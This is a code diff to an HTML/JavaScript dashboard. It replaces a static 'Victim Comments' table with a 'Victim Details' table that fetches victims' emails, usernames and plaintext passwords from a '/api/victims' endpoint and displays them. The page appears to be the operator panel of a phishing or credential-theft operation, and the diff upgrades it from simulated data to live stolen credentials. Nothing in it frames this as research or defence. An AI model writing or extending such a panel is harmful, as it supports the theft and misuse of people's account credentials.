@@ -33,13 +33,15 @@
             </ul>
         </div>
 
-        <!-- Table to display usernames and comments from victims -->
+        <!-- Table to display usernames, emails, passwords, and comments from victims -->
         <div class="traffic-card">
-            <h2>Victim Comments</h2>
-            <table id="comments-table">
+            <h2>Victim Details</h2>
+            <table id="victim-details-table">
                 <thead>
                     <tr>
+                        <th>Email</th>
                         <th>Username</th>
+                        <th>Password</th>
                         <th>Comment</th>
                     </tr>
                 </thead>
@@ -64,6 +66,7 @@
 
         // Simulate traffic data for the example
         function updateTrafficData() {
+            // Simulate real-time data
             document.getElementById('active-users').textContent = Math.floor(Math.random() * 1000);
             document.getElementById('victim-details').textContent = Math.floor(Math.random() * 100);
             document.getElementById('last-update-details').textContent = new Date().toLocaleTimeString();
@@ -84,28 +87,52 @@
                 trafficEventsList.appendChild(li);
             });
 
-            // Fetch victim comments and usernames (Simulated with a static list for now)
-            const victimComments = [
-                { username: "User 123", comment: "Account hacked through phishing" },
-                { username: "User 456", comment: "Personal data leaked due to security breach" },
-                { username: "User 789", comment: "Credentials stolen from a compromised site" },
-                { username: "User 1010", comment: "Sensitive information exposed in a cyberattack" }
-            ];
+            // Fetch victim data from the backend API (Replace this with the actual API endpoint)
+            fetch('/api/victims')  // Assuming there's an endpoint that returns victims' data
+                .then(response => response.json())
+                .then(victimData => {
+                    const tableBody = document.getElementById('victim-details-table').getElementsByTagName('tbody')[0];
+                    tableBody.innerHTML = ''; // Clear existing rows
 
-            const tableBody = document.getElementById('comments-table').getElementsByTagName('tbody')[0];
-            tableBody.innerHTML = ''; // Clear existing rows
-            victimComments.forEach(entry => {
-                const row = document.createElement('tr');
-                const usernameCell = document.createElement('td');
-                const commentCell = document.createElement('td');
+                    if (victimData.length === 0) {
+                        const row = document.createElement('tr');
+                        const noDataCell = document.createElement('td');
+                        noDataCell.colSpan = 4;
+                        noDataCell.textContent = "No victim data available.";
+                        row.appendChild(noDataCell);
+                        tableBody.appendChild(row);
+                    }
 
-                usernameCell.textContent = entry.username;
-                commentCell.textContent = entry.comment;
+                    victimData.forEach(entry => {
+                        const row = document.createElement('tr');
+                        const emailCell = document.createElement('td');
+                        const usernameCell = document.createElement('td');
+                        const passwordCell = document.createElement('td');
+                        const commentCell = document.createElement('td');
 
-                row.appendChild(usernameCell);
-                row.appendChild(commentCell);
-                tableBody.appendChild(row);
-            });
+                        emailCell.textContent = entry.email;
+                        usernameCell.textContent = entry.username;
+                        passwordCell.textContent = entry.password;
+                        commentCell.textContent = entry.comment;
+
+                        row.appendChild(emailCell);
+                        row.appendChild(usernameCell);
+                        row.appendChild(passwordCell);
+                        row.appendChild(commentCell);
+                        tableBody.appendChild(row);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching victim data:', error);
+                    const tableBody = document.getElementById('victim-details-table').getElementsByTagName('tbody')[0];
+                    tableBody.innerHTML = ''; // Clear existing rows
+                    const row = document.createElement('tr');
+                    const errorCell = document.createElement('td');
+                    errorCell.colSpan = 4;
+                    errorCell.textContent = "Error fetching data. Please try again later.";
+                    row.appendChild(errorCell);
+                    tableBody.appendChild(row);
+                });
         }
 
         // Update traffic every 5 seconds
